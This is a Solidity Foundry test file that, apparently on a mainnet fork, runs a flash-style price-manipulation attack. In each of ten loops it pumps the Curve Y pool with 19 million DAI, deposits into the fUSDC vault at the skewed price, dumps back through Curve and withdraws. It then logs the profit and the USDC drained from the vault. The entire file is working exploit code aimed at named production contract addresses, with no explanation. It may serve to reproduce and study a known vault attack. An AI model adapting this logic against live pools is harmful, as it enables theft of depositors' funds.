// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestFUSDCQuick is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    /// @dev 10 iterations with 19M DAI pump
    function testDrain10Iters() public {
        uint256 daiPump = 19_000_000e18;
        uint256 usdcCapital = 19_000_000e6;

        deal(DAI, address(this), daiPump);
        deal(USDC, address(this), usdcCapital);

        IERC20(DAI).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);

        uint256 vaultBefore = IHVault(FUSDC).underlyingBalanceWithInvestment();
        emit log_named_uint("Vault USDC before", vaultBefore);

        for (uint256 i = 0; i < 10; i++) {
            uint256 daiBal = IERC20(DAI).balanceOf(address(this));
            if (daiBal < 1e18) break;

            uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(0, 1, daiBal, 0);
            uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

            IHVault(FUSDC).deposit(pumpedUSDC);
            uint256 shares = IHVault(FUSDC).balanceOf(address(this));

            uint256 dumpAmt = IERC20(USDC).balanceOf(address(this));
            if (dumpAmt > usdcCapital) dumpAmt = usdcCapital;
            ICurveYPool(CURVE).exchange_underlying(1, 0, dumpAmt, 0);

            IHVault(FUSDC).withdraw(shares);

            emit log_named_uint("Iter", i);
            emit log_named_uint("USDC", IERC20(USDC).balanceOf(address(this)));
            emit log_named_uint("DAI", IERC20(DAI).balanceOf(address(this)));
            emit log_named_uint("Vault", IHVault(FUSDC).underlyingBalanceWithInvestment());
        }

        uint256 uf = IERC20(USDC).balanceOf(address(this));
        uint256 df = IERC20(DAI).balanceOf(address(this));
        uint256 vaultAfter = IHVault(FUSDC).underlyingBalanceWithInvestment();

        emit log("=== SUMMARY ===");
        emit log_named_int("Net USDC (6 dec)", int256(uf) - int256(usdcCapital));
        emit log_named_int("Net DAI (18 dec)", int256(df) - int256(daiPump));
        int256 totalNet = (int256(uf) - int256(usdcCapital)) * 1e12 + (int256(df) - int256(daiPump));
        emit log_named_int("Net total (DAI units)", totalNet);
        emit log_named_int("Vault drained USDC", int256(vaultBefore) - int256(vaultAfter));
    }
}
